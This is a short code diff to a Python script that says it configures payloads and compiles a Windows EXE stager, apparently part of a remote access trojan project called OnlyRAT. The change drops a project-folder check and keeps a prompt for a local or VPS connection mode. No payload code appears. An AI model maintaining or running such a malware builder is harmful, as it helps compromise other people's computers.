@@ -30,10 +30,7 @@ def main():
     print("==============================")
     print("This script configures payloads and compiles a Windows EXE stager.\n")
 
-    base_dir = "MK01-OnlyRAT-main"
-    if not os.path.exists(base_dir):
-        print(f"[!] Error: {base_dir} directory not found. Please run this script in the root folder.")
-        sys.exit(1)
+    base_dir = "."
 
     mode = get_input("Connection Mode (local/vps)", "vps").lower()
 
